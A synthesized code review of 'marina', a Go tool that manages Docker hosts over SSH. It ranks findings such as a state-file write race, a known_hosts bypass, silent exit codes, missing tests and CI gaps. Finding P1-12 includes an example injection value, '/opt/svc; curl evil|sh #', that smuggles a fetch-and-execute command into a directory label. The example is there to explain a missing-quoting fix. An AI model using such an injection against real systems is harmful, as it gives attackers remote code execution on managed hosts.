# Marina Code Review — 2026-04-17

**Reviewers**: marina-architect, runtime-guy, io-security, reliability-master, marina-qa  
**Synthesized by**: team-lead  
**Codebase**: `github.com/AhmedAburady/marina`, Go 1.26.2, ~8,700 LOC, 0 tests

---

## Executive Summary

- **Two structural P0s demand immediate attention**: the `state.json` write path is both racy (concurrent `SaveHostSnapshot` goroutines silently overwrite each other) and non-atomic (crash mid-write corrupts the offline fallback); and `marina update --all --yes` / `marina prune --all` exit 0 even when every host fails, silently breaking cron/CI consumers.
- **The README's `known_hosts` guarantee is not structurally enforced** for Docker traffic: `connhelper` delegates to the system `ssh` binary, which obeys `~/.ssh/config` overrides. A user with `StrictHostKeyChecking no` has an unguarded data plane.
- **The "no drift, no surprises" engine promise is aspirationally correct but three P1 paths violate it**: TUI purge re-implements `actions.PurgePlan` inline, CLI `marina update` bypasses `actions.ComposeOp`/`actions.Prune`, and CLI persists the registry cache while TUI discards it.
- **TUI commands discard the screen's context** (`context.Background()`), so Ctrl+C cannot cancel in-flight SSH work and remote processes are orphaned — three specialists flagged this independently.
- **Zero tests across ~8,700 LOC** and a release pipeline that ships without running `go vet`, has no `-trimpath`, no checksums, and cross-compiles all six targets from a single Linux runner without validating any.
- **The codebase is architecturally sound and the Go foundations are good** (`go vet` + `go mod tidy` both clean, consistent `%w` wrapping, no panics outside `main`, `FetchAllHosts` already models partial failure correctly). The work required is *completing* the existing architecture, not replacing it.

---

## Severity-Ranked Findings

### P0 — Fix before next deploy

---

#### P0-1 · `state.json` concurrent write race + non-atomic save
- **Category**: runtime · io-security · reliability  
- **Location**: `internal/state/state.go:104-114`, `internal/actions/fetch.go:79`
- **Evidence**:
  ```go
  // fetch.go:79 — one call per host goroutine, concurrent
  _ = state.SaveHostSnapshot(host, &state.HostSnapshot{...}, "")

  // state.go:105 — Load → modify → Save with no lock, no atomic rename
  func SaveHostSnapshot(hostName string, snapshot *HostSnapshot, path string) error {
      store, err := Load(path)           // reads current file
      store.Hosts[hostName] = snapshot   // in-memory mutation
      return Save(store, path)           // os.WriteFile — truncate then write
  }
  ```
- **Why it matters**: `FetchAllHosts` spawns one goroutine per host; each calls `SaveHostSnapshot` concurrently. Classic lost-update: the goroutine that reads first but writes last silently overwrites all sibling snapshots. Over time the cache shrinks toward one host per fetch. Separately, `os.WriteFile` truncates before writing: a SIGTERM or OOM mid-write produces a zero- or half-byte file; next boot's `Load` fails and the TUI's offline fallback — Marina's only resilience mechanism during partial outages — is gone.
- **Recommendation**:
  1. **Hoist persistence out of the fan-out**: after `FetchAllHosts` collects all live results, do a single `state.Load → merge all → state.Save`.
  2. **Make `Save` atomic**: write to `path + ".tmp"`, then `os.Rename` (POSIX-atomic; Windows `MoveFileEx` with `MOVEFILE_REPLACE_EXISTING`):
     ```go
     tmp, err := os.CreateTemp(filepath.Dir(path), ".state-*.tmp.json")
     // ... write, sync, close ...
     os.Chmod(tmp.Name(), 0o600)
     return os.Rename(tmp.Name(), path)
     ```
  Apply the same pattern to `internal/config/config.go:135` and `internal/registry/cache.go:85`.
- **Effort**: S

---

#### P0-2 · Docker data path bypasses Marina's `known_hosts` enforcement
- **Category**: io-security  
- **Location**: `internal/docker/client.go:36-37`
- **Evidence**:
  ```go
  helper, err := connhelper.GetConnectionHelperWithSSHOpts(address,
      []string{"-o", "ServerAliveInterval=15", "-o", "ServerAliveCountMax=3"})
  ```
- **Why it matters**: Every Docker API call (list, inspect, logs, compose) flows through `docker/connhelper`, which shells out to the system `ssh` binary — not through `internal/ssh/ssh.go`. A user with `StrictHostKeyChecking no` or `UserKnownHostsFile /dev/null` in `~/.ssh/config` (common in homelab/tailnet setups) turns the primary data plane into a MITM-exposed channel. The README and `ssh.go` both promise `known_hosts` is always enforced; structurally this is false for all Docker traffic.
- **Recommendation** (two options, ascending effort):
  - **S**: Append explicit hardening flags:
    ```go
    sshFlags = append(sshFlags,
        "-o", "StrictHostKeyChecking=yes",
        "-o", "UserKnownHostsFile=~/.ssh/known_hosts",
        "-o", "BatchMode=yes",
    )
    ```
  - **L**: Replace `connhelper` with `internal/ssh` + a custom `net.Conn` that calls `docker system dial-stdio` through the hardened `golang.org/x/crypto/ssh` client — the only way to make the guarantee structurally true.
- **Effort**: S (flags) / L (full fix)

---

#### P0-3 · `update --all --yes` and `prune --all` silently exit 0 on per-host failures
- **Category**: reliability  
- **Location**: `commands/updates.go:317`, `commands/prune.go:162`
- **Evidence**:
  ```go
  // updates.go:317 — unconditional nil after printing warnings
  return nil

  // prune.go:162
  return nil  // after fmt.Fprintf warning loop
  ```
- **Why it matters**: Cron jobs and CI pipelines rely on exit codes. Today a full-cluster update where every host fails still reports success. The README promises "scriptable" CLI output; exit-code correctness is fundamental to that contract. Post-apply prune failures (`commands/updates.go:291-316`) are lost via the same pattern, compounding silently across runs.
- **Recommendation**: Aggregate per-host failures into a typed error and return it:
  ```go
  type HostStackErr struct{ Host, Stack string; Err error }
  type ApplyErr struct{ Failures []HostStackErr }
  func (e *ApplyErr) Error() string { return fmt.Sprintf("%d host(s) failed: …", len(e.Failures)) }
  func (e *ApplyErr) Unwrap() []error { /* so errors.Is/As works */ }
  ```
  `errors.Unwrap() []error` is supported since Go 1.20; `errors.AsType[*ApplyErr]` (Go 1.26) makes type-safe inspection in tests cleaner. Include prune failures in the same aggregate (finding P1-3 below).
- **Effort**: M

---

### P1 — Fix this sprint

---

#### P1-1 · TUI purge re-implements `actions.PurgePlan` inline
- **Category**: architect  
- **Location**: `internal/tui/stacks.go:552-571` vs `internal/actions/stacks.go:126-178`
- **Evidence**:
  ```go
  // internal/tui/stacks.go:559 — manual sequence
  SequenceCmds(
      ComposeExecCmd(sshCfg, dir, "down --remove-orphans", "compose.down", key),
      DockerExecCmd(sshCfg, "rm -rf "+shellQuote(dir), "dir.rm", key),
      DockerExecCmd(sshCfg, "docker image prune -f", "image.prune", key),
  )
  ```
  `actions.PurgePlan` already returns this exact step list and the CLI consumes it (`commands/stacks.go:177`).
- **Why it matters**: If purge grows a step (volume removal, stack-name normalization), the CLI picks it up automatically and the TUI silently diverges — exactly the drift `actions/` was created to prevent.
- **Recommendation**: Drive TUI purge from `actions.PurgePlan`; delete the inline `shellQuote` copy in `stacks.go:627` (also fixes the `shellQuote` duplication in P1-5).
- **Effort**: M

---

#### P1-2 · CLI `marina update` bypasses `actions.ComposeOp` and `actions.Prune`
- **Category**: architect  
- **Location**: `commands/updates.go:321-409`
- **Evidence**:
  ```go
  // commands/updates.go:373 — hand-rolled, bypasses actions layer
  _, err := internalssh.Exec(ctx, sshCfg,
      fmt.Sprintf("cd %s && docker compose pull && docker compose up -d", dir))
  // commands/updates.go:407
  _, err := internalssh.Exec(ctx, sshCfg, "docker image prune -f")
  ```
  The TUI runs `pull` then `up -d` as two distinct compose calls with stop-on-error semantics (`SequenceCmds`); the CLI chains them with `&&` in a single shell exec — different failure surfaces.
- **Why it matters**: Highest-risk drift surface: `marina update --all --yes` (the primary cron entry point) and the TUI apply produce *different* on-host effects. Different audit-log shapes, different partial-failure behavior.
- **Recommendation**: Promote `runStackUpdate{,Quiet}` / `runHostPrune{,Quiet}` into `actions/updates.go` as `ApplyStackUpdate(ctx, sshCfg, dir, io.Writer) error`. Both front doors decorate it.
- **Effort**: M

---

#### P1-3 · CLI registry check persists cache; TUI discards it
- **Category**: architect  
- **Location**: `commands/updates.go:460` vs `internal/tui/updates.go:395-400`
- **Evidence**:
  ```go
  // CLI
  _ = registry.SaveCache(cache, "")   // persists

  // TUI — third return (cache) discarded with _
  candidates, check, _, err := registry.BuildChecker(...)
  ```
- **Why it matters**: After a TUI check the next `marina check` CLI run starts cold, doubling registry traffic in a "checked in dashboard, then cron ran" workflow. Asymmetric state from the same operation.
- **Recommendation**: Lift the `BuildChecker → fan-out → SaveCache` orchestration into `actions/checks.go`. Both front doors call through it; `SaveCache` happens in one place.
- **Effort**: M

---

#### P1-4 · Host-target resolution copy-pasted across four CLI commands
- **Category**: architect  
- **Location**: `commands/ps.go:36-56`, `commands/stacks.go:99-120`, `commands/updates.go:514-537`, `commands/prune.go:58-115`
- **Evidence**: Same ~20-line block (`-H` precedence → `--all` → interactive `ui.SelectHost`) with minor variations in four files. `prune.go` builds `[]*hostContext`; the others build `map[string]*config.HostConfig` — drift is already visible.
- **Why it matters**: A new flag (`-H foo,bar` multi-host) must be changed in four places; the shape differences mean the "same" logic already has two signatures.
- **Recommendation**: Extract into `commands/helpers.go` as `resolveTargets(gf *GlobalFlags, cfg *config.Config) (map[string]*config.HostConfig, error)`.
- **Effort**: S

---

#### P1-5 · Two identical `shellQuote` copies — divergence risk on a destructive path
- **Category**: architect  
- **Location**: `internal/actions/stacks.go:183-188` and `internal/tui/stacks.go:627-632`
- **Evidence**: Identical bodies. Neither rejects `$`, backticks, `;`, or newlines — only `'`, `"`, `\`. (See also io-security finding P1-6 for `ComposeOp`'s missing quoting.)
- **Why it matters**: If one copy gains a security fix and the other doesn't, the TUI purge path becomes more permissive than the CLI on a destructive `rm -rf` operation.
- **Recommendation**: Export `actions.ShellQuote`; delete the TUI copy. Resolves automatically when P1-1 lands.
- **Effort**: S

---

#### P1-6 · CLI prune duplicates `actions.PruneCommand` — two command-string builders
- **Category**: architect  
- **Location**: `commands/prune.go:39-50` vs `internal/actions/prune.go:21-32`
- **Evidence**: Both functions return the same string for the same flag combination. The TUI confirm modal previews the command via `actions.PruneCommand`; the CLI computes its own.
- **Recommendation**: Delete `commands/prune.go:pruneCommand`; call `actions.PruneCommand(...)`.
- **Effort**: S

---

#### P1-7 · TUI actions use `context.Background()` — Ctrl+C cannot cancel in-flight SSH work
- **Category**: architect · runtime · reliability (three specialists)  
- **Location**: `internal/tui/actions.go:61` (`ComposeExecCmd`), `:85` (`rawExec`)
- **Evidence**:
  ```go
  out, err := actions.ComposeOp(context.Background(), sshCfg, dir, subCmd)
  return internalssh.Exec(context.Background(), sshCfg, command)
  ```
  Every screen carries `s.ctx`; `internal/tui/prune.go:92` already does this correctly (`pruneExecCmd(ctx, ...)`).
- **Why it matters**: A `compose pull` against a slow registry blocks for minutes; the user pressing Ctrl+C kills the UI while the SSH session continues on the remote host. Orphaned remote processes are a known homelab footgun. Also breaks any future per-screen timeout.
- **Recommendation**: Thread `s.ctx` through `ComposeExecCmd` / `DockerExecCmd` / `rawExec`. Seven call sites need updating. Pair with `tea.WithContext(ctx)` at program level for belt-and-suspenders signal handling (Go 1.26 `signal.NotifyContext` with cause propagation improves error messages when a signal fires mid-exec).
- **Effort**: S

---

#### P1-8 · `BuildChecker` fails closed on first host error
- **Category**: runtime  
- **Location**: `internal/registry/check.go:53-60`
- **Evidence**:
  ```go
  candidates, err = gatherCandidates(ctx, cfg, targets)
  if err != nil {
      return nil, nil, nil, err   // whole pass aborted on first per-host error
  }
  ```
- **Why it matters**: One transient SSH failure blanks the entire Updates screen even though all other hosts returned successfully — exactly the partial-failure resilience `state.json` was built to preserve. `FetchAllHosts` already handles this correctly; `BuildChecker` regresses the contract.
- **Recommendation**: Return `(candidates, firstErr)` from `gatherCandidates`; accept partial results — surface per-host errors as `Result` rows with `Status: "host unreachable"` (mirroring the existing pattern in `internal/tui/containers.go:336-345`).
- **Effort**: S

---

#### P1-9 · Registry HEAD requests have no HTTP client timeout
- **Category**: io-security  
- **Location**: `internal/registry/registry.go:73-76`
- **Evidence**:
  ```go
  desc, err := remote.Head(ref,
      remote.WithAuthFromKeychain(authn.DefaultKeychain),
      remote.WithContext(ctx),      // caller ctx — often context.Background() from TUI
  )
  ```
- **Why it matters**: `go-containerregistry` uses `http.DefaultTransport` with no `ResponseHeaderTimeout`. Docker Hub returns HTTP 429 with `Retry-After` or slow-rolls; combined with TUI's `context.Background()` (P1-7), the update checker can stall indefinitely while holding a goroutine per candidate.
- **Recommendation**: Build a shared `*http.Transport` with `ResponseHeaderTimeout: 15s`, `TLSHandshakeTimeout: 10s`, `MaxIdleConnsPerHost: 4` and pass via `remote.WithTransport(...)`. Handle `transport.Error{StatusCode: 429}` explicitly using Go 1.26's `errors.AsType[*transport.Error](err)` and surface as `Status: "rate-limited"`.
- **Effort**: S

---

#### P1-10 · SSH key paths not tilde-expanded — shipped example cannot be used
- **Category**: io-security  
- **Location**: `internal/ssh/ssh.go:106`, `internal/docker/client.go:33`, `config.yaml.example:9,15`
- **Evidence**: Example ships `ssh_key: ~/.ssh/id_ed25519`; `os.ReadFile("~/.ssh/id_ed25519")` returns ENOENT. The system `ssh` binary (used by `connhelper`) expands `~`; Go's path handling does not.
- **Why it matters**: Correctness bug and documentation divergence — implies the example has never been tested end-to-end via the Go SSH path.
- **Recommendation**: Add `expandPath(p string) string` in `internal/config/config.go`, apply to `Settings.SSHKey` and each `HostConfig.SSHKey` during `Load`. Use `os.UserHomeDir()` + `os.ExpandEnv`.
- **Effort**: S

---

#### P1-11 · No SSH key file permission advisory check
- **Category**: io-security  
- **Location**: `internal/ssh/ssh.go:106-115`
- **Evidence**: `os.ReadFile(cfg.KeyPath)` with no `os.Stat` / mode check.
- **Why it matters**: OpenSSH refuses keys with group- or world-readable permissions; Marina loads them silently. A user copying a key with default umask (0644) loses the safety rail OpenSSH provides.
- **Recommendation**: After `os.ReadFile`, `os.Stat` and reject if `info.Mode().Perm()&0o077 != 0`. Guard with `runtime.GOOS != "windows"` (ACL model). Emit: `"SSH key %s has permissions %o; run chmod 600 %s"`.
- **Effort**: S

---

#### P1-12 · `ComposeOp` interpolates compose directory into shell command without quoting
- **Category**: io-security  
- **Location**: `internal/actions/stacks.go:96-102`
- **Evidence**:
  ```go
  cmd := fmt.Sprintf("cd %s && docker compose %s", dir, subCmd)
  return internalssh.Exec(ctx, sshCfg, cmd)
  ```
  `PurgePlan` at `stacks.go:135` does quote with `shellQuote(dir)` — the inconsistency is visible within the same file.
- **Why it matters**: A malicious compose label `com.docker.compose.project.working_dir: /opt/svc; curl evil|sh #` runs arbitrary commands as the SSH user on any `marina restart`/`update`/`pull`. The trust model should be hardened, not assumed.
- **Recommendation**: `q := actions.ShellQuote(dir); if q == "" { return "", fmt.Errorf("refusing compose in %q: unsafe shell characters", dir) }`. Apply the same guard in `ContainerOp` for non-hex container IDs.
- **Effort**: S

---

#### P1-13 · Gotify client accepts `http://` URLs — token transmitted in cleartext
- **Category**: io-security  
- **Location**: `internal/notify/gotify.go:36-44`
- **Evidence**: `req.Header.Set("X-Gotify-Key", cfg.Token)` with no scheme check; `config.yaml.example:20` suggests https but nothing enforces it.
- **Why it matters**: Gotify tokens are long-lived secrets. An `http://` URL (common in homelab "I'll add TLS later" setups) transmits the token in plaintext; a captive portal or ARP spoofing attack intercepts it permanently.
- **Recommendation**: Parse URL, require `scheme == "https"` unless host is a loopback. Set `CheckRedirect` to refuse scheme downgrades.
- **Effort**: S

---

#### P1-14 · TUI `dashboard.Update()` has no panic recovery
- **Category**: reliability  
- **Location**: `internal/tui/dashboard.go:41-77`
- **Evidence**: `m.top().Update(msg)` with no `defer recover()`. Async `tea.Cmd` results (e.g. `ActionResultMsg`, `checkerReadyMsg`) can carry nil values that dereference inside screen `Update` methods (real risk at `internal/tui/updates.go:562-563`).
- **Why it matters**: A nil-deref crashes the whole process, leaves the terminal in alt-screen mode, and loses all in-flight state.
- **Recommendation**:
  ```go
  defer func() {
      if r := recover(); r != nil {
          Log().Error("tui.panic", "msg_type", fmt.Sprintf("%T", msg),
              "panic", r, "stack", string(debug.Stack()))
          // swap top screen with error-recovery screen
      }
  }()
  ```
  Enable `GOEXPERIMENT=goroutineleakprofile` (Go 1.26) in CI to catch related goroutine leaks.
- **Effort**: S

---

#### P1-15 · No `-v`/`--debug` flag — fan-out timings are invisible
- **Category**: reliability  
- **Location**: `commands/root.go:15-21` (`GlobalFlags` has no verbosity field)
- **Evidence**: `fetchOneHost` (`internal/actions/fetch.go:71-83`) has zero slog calls, no timing. `marina ps --all` with 10+ hosts gives no diagnostics for "why is it slow?".
- **Why it matters**: Cron jobs that stall can't be post-mortem'd. The audit log (`~/.config/marina/marina.log`) doesn't include fetch timings so even `tail -f` in another pane is unhelpful.
- **Recommendation**: Add `--debug` to `GlobalFlags`; gate a stderr `slog.Handler` behind it using Go 1.26's `slog.NewMultiHandler`. Add `time.Since(start)` timing around each `fetchOneHost` call. See Go 1.26 release notes: `slog.NewMultiHandler` is new in 1.26 and removes the need for a custom multi-sink handler.
- **Effort**: M

---

#### P1-16 · Zero automated tests across ~8,700 LOC
- **Category**: qa  
- **Location**: repo-wide
- **Evidence**: `find . -name '*_test.go'` returns only vendored skill-example files. CLAUDE.md: "no test suite exists yet."
- **Why it matters**: Every correctness guarantee (digest comparison, stack grouping, partial-failure semantics, cache fallback) is enforced only by human review. A wrong refactor in `internal/registry/check.go` ships straight to users.
- **Recommendation** (staged, highest ROI first):
  1. `internal/registry` — fake in-process registry via `go-containerregistry`'s `pkg/registry` + `httptest.Server`. Cover up-to-date, update-available, pinned-digest short-circuit, non-running skipped.
  2. `internal/discovery` — `GroupByStack` is a pure function; table-driven golden cases.
  3. `internal/config` — round-trip YAML load/save/override using `t.TempDir()`.
  4. `internal/ssh` — spin up `golang.org/x/crypto/ssh` test server; cover `Exec`, `Stream`, known_hosts rejection.
  5. `internal/actions.FetchAllHosts` — use `testing/synctest` (Go 1.24+, stable 1.25) for deterministic partial-failure goroutine tests with a fake clock.
  6. CLI golden tests — `ui.PrintContainerTable` output against `testdata/*.golden` with `-update` flag.
- **Effort**: L (staged: S registry+discovery, M ssh+actions, L TUI)

---

#### P1-17 · Release pipeline: six CI/CD gaps
- **Category**: qa  
- **Location**: `.github/workflows/release.yml`
- **Sub-findings** (all S effort individually):

| # | Gap | Evidence | Fix |
|---|-----|----------|-----|
| A | Floating Go version `'1.26'` ≠ `go.mod` `1.26.2` | `go-version: '1.26'` | `go-version-file: go.mod` |
| B | Missing `-trimpath` — non-reproducible binaries | bare `go build` | add `-trimpath` |
| C | No checksums or signatures on release artifacts | `softprops/action-gh-release` uploads raw binaries | `sha256sum marina-* > SHA256SUMS` + include in release |
| D | No `go test` / `go vet` before publish | workflow jumps checkout → build | gate `build` job on a `test` job |
| E | No CI on push/PR | only `push: tags: v*` trigger | add `.github/workflows/ci.yml` |
| F | All six targets cross-compiled from single `ubuntu-latest` | `runs-on: ubuntu-latest` | matrix `os: [ubuntu-latest, macos-latest, windows-latest]` |

- **Effort**: S per item; M for full `goreleaser` migration (handles B, C, and packaging in one config)

---

### P2 — Next quarter

---

#### P2-1 · Per-host inspect goroutines wasted — `MaxConnsPerHost: 1` serialises them
- **Category**: runtime  
- **Location**: `internal/registry/check.go:188-215`, `internal/docker/client.go:44`
- **Evidence**: Spawns one goroutine per unique image to call `InspectContainer`; the `MaxConnsPerHost: 1` transport means they queue strictly sequentially. For 80 unique images: 80 goroutines + mutex contention + WaitGroup overhead, all executing in lockstep through one SSH pipe.
- **Recommendation**: Replace with a sequential loop — same wall-clock latency, zero allocations for goroutines/mutex/WaitGroup. If `MaxConnsPerHost` is ever raised, reintroduce bounded `errgroup.SetLimit(N)` fan-out.
- **Effort**: S

---

#### P2-2 · CLI `runChecks` fan-out is unbounded — N concurrent HEAD requests
- **Category**: runtime  
- **Location**: `commands/updates.go:448-457`
- **Evidence**: `wg.Add(1) → go func` for every candidate; 100+ containers fires 100+ simultaneous `remote.Head` requests. Docker Hub rate-limits at HTTP 429.
- **Recommendation**: Replace with `errgroup.WithContext(ctx)` + `g.SetLimit(8)`. Pair with configured `http.Transport` (per P1-9) for connection reuse.
- **Effort**: S

---

#### P2-3 · `SaveCache` always writes `null` — dead code + misleading file
- **Category**: runtime · io-security (two specialists)  
- **Location**: `commands/updates.go:460`, `internal/registry/check.go:51-56`, `internal/registry/cache.go`
- **Evidence**:
  ```go
  // check.go comment: "The returned *Cache is nil"
  return candidates, checkFn, nil, nil   // cache always nil

  // updates.go:460
  _ = registry.SaveCache(cache, "")   // writes literal "null" to disk
  ```
  `cache.go` exports `Lookup`/`Store`/`InvalidateRef`/`CacheTTL` — all dead code from any production call path.
- **Recommendation**: Delete `SaveCache` call site, `internal/registry/cache.go` on-disk half (`LoadCache`, `SaveCache`, `DefaultCachePath`), and the `null`-producing call in `updates.go`. Keep the in-cycle `sync.Map` dedup in `check.go`. Rename the file to `dedup.go`.
- **Effort**: S

---

#### P2-4 · `updatesScreen` filter/select helpers are O(N²) per keypress
- **Category**: runtime  
- **Location**: `internal/tui/updates.go:474-510`, `:664-680`
- **Evidence**: `absoluteIndex(visibleIdx)` walks `s.results` linearly; `toggleAll` calls it in a loop over filtered items. With 100+ candidates, every cursor move or space-bar press triggers O(N²) work inside `Update()`.
- **Recommendation**: Build `visible []Result` + `visibleToAbs []int` once per state change (filter text, toggle, new results), stored on the screen. `containersScreen` and `stacksScreen` already do this with `s.visible` / `rebuildVisible()` — apply the same pattern.
- **Effort**: S

---

#### P2-5 · `clientDone` goroutine may leak on half-open SSH connections
- **Category**: io-security  
- **Location**: `internal/ssh/ssh.go:246-254`
- **Evidence**: `go func() { c.Wait(); close(ch) }()` — `ssh.Client.Wait` returns only when the transport closes. NAT drops without TCP keepalives (not configured on Marina's direct SSH path) leave this goroutine blocked indefinitely. Accumulates one leaked goroutine per stuck host per TUI fetch tick.
- **Recommendation**: Set `clientCfg.KeepAliveInterval = 15 * time.Second` + `KeepAliveCountMax: 3` (Go 1.23 added these fields to `ssh.ClientConfig`). Drop `clientDone`; use `defer client.Close()` + a single `<-ctx.Done(); client.Close()` goroutine that exits with the outer function.
- **Effort**: S

---

#### P2-6 · Fan-out pattern duplicated three times with no context-cancellation during `range ch`
- **Category**: runtime  
- **Location**: `internal/actions/fetch.go:39-67`, `internal/registry/check.go:129-166`, `commands/updates.go:230-275`
- **Evidence**: Three near-identical `wg.Add(1) → goroutine → ch ← result` + `go func() { wg.Wait(); close(ch) }()` patterns. None honour `ctx.Done()` while blocked in `range ch`.
- **Recommendation**: Extract `FanOut[T any](ctx context.Context, items []T, fn func(T) T) iter.Seq[T]` backed by `errgroup.Group` (Go 1.23 range-over-func iterators). Returns results as they arrive; caller breaks on `ctx.Err()`. Replaces all three fan-out blocks.
- **Effort**: M

---

#### P2-7 · SSH agent auth silently no-ops on Windows
- **Category**: qa  
- **Location**: `internal/ssh/ssh.go:91-100`
- **Evidence**: `net.Dial("unix", sock)` — Windows OpenSSH agent uses a named pipe (`\\.\pipe\openssh-ssh-agent`), not a unix socket. `SSH_AUTH_SOCK` is typically unset on Windows.
- **Recommendation**: Add a `ssh_agent_windows.go` build-tagged file using `winio.DialPipe` (`github.com/Microsoft/go-winio` is already an indirect dep). Also pass `-o IdentitiesOnly=yes` when `-i <key>` is set in `connhelper` so only the declared key is tried.
- **Effort**: M

---

#### P2-8 · Hardcoded `~/.config/marina/` breaks XDG and Windows conventions
- **Category**: qa  
- **Location**: `internal/config/config.go:83`, `internal/state/state.go:19`, `internal/registry/cache.go:38`, `internal/tui/log.go:42-48`
- **Evidence**: `filepath.Join(home, ".config", "marina", ...)` — ignores `XDG_CONFIG_HOME` on Linux; wrong on macOS (`~/Library/Application Support/`) and Windows (`%AppData%`).
- **Recommendation**: Replace all four call sites with `os.UserConfigDir()` (stdlib since Go 1.13) for config/state/log; use `os.UserCacheDir()` for `check-cache.json` (it is a cache, not config). Keep a back-compat read-fallback for one release cycle.
- **Effort**: M

---

#### P2-9 · Missing `.golangci.yml` — no enforced lint contract
- **Category**: qa  
- **Location**: repo root
- **Evidence**: `ls .golangci*` returns nothing; CLAUDE.md calls lint "optional."
- **Recommendation**: Commit `.golangci.yml` (v2 format) enabling at minimum: `errcheck`, `govet`, `ineffassign`, `staticcheck`, `revive`, `gosec`, `misspell`. Wire into the CI workflow (P1-17E).
- **Effort**: S

---

#### P2-10 · GitHub Actions pinned by floating tag — supply-chain risk
- **Category**: qa  
- **Location**: `.github/workflows/release.yml:16,19,41`
- **Evidence**: `uses: softprops/action-gh-release@v1` — a compromised `v1` tag re-point runs with `contents: write` permission. The `tj-actions/changed-files` compromise (March 2025) used this exact vector.
- **Recommendation**: Pin all third-party actions by full commit SHA with a version comment. Add `dependabot.yml` with `package-ecosystem: github-actions`.
- **Effort**: S

---

#### P2-11 · Gotify token in plaintext YAML
- **Category**: io-security  
- **Location**: `config.yaml.example:21`, `internal/config/config.go:72-75`
- **Evidence**: `Token string` with `yaml:"token"` — no keychain/secret-service integration.
- **Why it matters**: Low-severity by itself (local-user threat model), but structurally undefensible.
- **Recommendation**: Short-term: add `# Stored in plaintext — keep this file 0600` to example. Medium-term: support `token_env: MARINA_GOTIFY_TOKEN`. Long-term: `github.com/zalando/go-keyring`.
- **Effort**: S (env var) / M (keychain)

---

#### P2-12 · No `teatest` harness for TUI and no golden-file tests for CLI tables
- **Category**: qa  
- **Location**: `internal/tui/` (11 screen files), `internal/ui/table.go`
- **Evidence**: 0 `*_test.go` files. CLAUDE.md: "subcommands print bordered tables (scriptable)" — any lipgloss padding change silently breaks downstream scripts.
- **Recommendation**: CLI tables: `testdata/*.golden` with `-update` flag. TUI: `teatest` (ships with `charm.land/bubbletea/v2`) for smoke tests of screen navigation + filter + confirm; start with "no panic + non-empty View" assertions.
- **Effort**: M (tables), L (TUI)

---

#### P2-13 · `No AuthLogCallback` or `IdentitiesOnly=yes` in SSH config
- **Category**: io-security  
- **Location**: `internal/ssh/ssh.go:125-130`
- **Evidence**: `ssh.ClientConfig{}` has no `AuthLogCallback`; connhelper omits `IdentitiesOnly=yes` when `-i <key>` is specified (agent may be tried first).
- **Recommendation**: Add `AuthLogCallback` wired to slog; add `IdentitiesOnly=yes` to `sshFlags` when `sshKeyPath != ""`.
- **Effort**: S

---

### P3 — Backlog / polish

| # | Finding | Location | Recommendation | Effort |
|---|---------|----------|----------------|--------|
| P3-1 | Pre-1.21 `sort.Slice` in 11 files | `commands/updates.go:105`, 16 other sites | `slices.SortFunc` + `cmp.Or` (Go 1.21); run `go fix -apply` modernizers (Go 1.26) | S |
| P3-2 | 5× map→sorted-slice copy-paste | `commands/updates.go:119`, 4 other sites | `slices.Sorted(maps.Keys(m))` (Go 1.23) | S |
| P3-3 | Three "keep import alive" sentinels | `internal/tui/updates.go:711`, `actions.go:123`, `log.go:77` | Delete all three; the imports are used elsewhere in the package | S |
| P3-4 | Four near-identical `firstLine` helpers, two with byte-truncation UTF-8 bug | `commands/updates.go:413`, `tui/hosts.go:442`, `tui/log.go:64`, `tui/actions.go:73` | Consolidate into one rune-aware helper in `internal/strutil/`; `strings.Cut` + `[]rune` truncation | S |
| P3-5 | `tea.NewProgressBar` allocated every frame | `internal/tui/dashboard.go:114-124` | Cache on dashboard; update only when `pct` changes | S |
| P3-6 | `TUI direct `discovery` imports bypass `actions/` boundary | `internal/tui/stacks.go:380`, `commands/stacks.go:141` | Add `actions.StackGroupsFor(host, result, hostCfg)` forwarder | S |
| P3-7 | `commands/updates.go` at 585 LOC mixes 5 concerns | `commands/updates.go` (whole file) | After P1-2/P1-3: cobra wiring stays; orchestration → `actions/updates.go`; display helpers → `internal/ui/updates.go` | M |
| P3-8 | Capitalized error string | `internal/ssh/ssh.go:156` (`"SSH handshake..."`) | `"ssh handshake %s: %w"` | S |
| P3-9 | Dead `_ = fmt.Sprintf` in log helper | `internal/tui/log.go:77` | Delete line and unused `fmt` import | S |
| P3-10 | `parseAddress` ambiguous on IPv6 | `internal/ssh/ssh.go:36-62` | Require bracketed IPv6 `[::1]`; use `net/url.Parse` | S |
| P3-11 | Adopt `testing/synctest` for fan-out tests | future `internal/actions` tests | `synctest.Run` + `t.Context()` (Go 1.24+) for deterministic partial-failure timing | M |
| P3-12 | `errors.Is`/`errors.As` used only 3× — status detection uses fragile `strings.Contains` | `commands/updates.go:553-560` | Define typed sentinel errors (`ErrRateLimited`, etc.); use `errors.AsType[T]` (Go 1.26) | M |

---

## Findings by Category

### Architect (marina-architect)
13 findings: P1-1 through P1-7 (shared), P3-1 through P3-7. Theme: the `internal/actions/` shared engine exists and works but three high-traffic paths still bypass it. The duplication cost is compounding.

### Runtime (runtime-guy)
9 findings: P0-1 (shared), P1-7 (shared), P1-8, P2-1, P2-2, P2-3 (shared), P2-4, P2-6, P3-5. Theme: fan-out patterns are repeated three times with no cancellation; the one true concurrency bug (P0-1) is the most impactful fix in the codebase.

### I/O Security (io-security)
13 findings: P0-2, P1-9 through P1-13, P2-3 (shared), P2-5, P2-11, P2-13, P3-10. Theme: the control plane (`internal/ssh`) is hardened; the data plane (`connhelper`) is not, and several I/O primitives (registry client, state file, Gotify) lack basic robustness.

### Reliability (reliability-master)
15 findings: P0-3, P1-3 (shared), P1-7 (shared), P1-14 through P1-15, P2-0 (several swallowed errors mapped to P2 reliability), P3-8 through P3-12. Theme: error propagation is mostly correct at the SSH/config layer but breaks down at the CLI aggregate layer, where the tools users actually script against silently eat failures.

### QA (marina-qa)
17 findings: P1-16, P1-17 (7 sub-items), P2-7, P2-8, P2-9, P2-10, P2-12, P3-11. Theme: the module and `go vet` are both clean — foundation is solid. But the release pipeline is unguarded and the test vacuum means no change is safe to make without careful manual verification.

---

## Cross-Cutting Themes

### Theme 1: Context discipline — one root cause, three symptoms
Three specialists independently flagged `context.Background()` in TUI actions (P1-7), `BuildChecker` not respecting cancellation (P1-8), and the fan-out patterns not honouring `ctx.Done()` during `range ch` (P2-6). These all trace to the same missing discipline: contexts must flow all the way from the program signal handler through the TUI screen through every SSH call. The `internal/tui/prune.go:92` already does this right — use it as the template.

### Theme 2: Write-path safety — all three file writers are broken the same way
`state.json`, `config.yaml`, and `registry/cache.json` all use `os.WriteFile` (truncate-then-write, non-atomic). Fixing P0-1 with the temp-file+rename pattern once and applying it to all three write paths cleans up three independent findings at once and makes the overall durability story coherent.

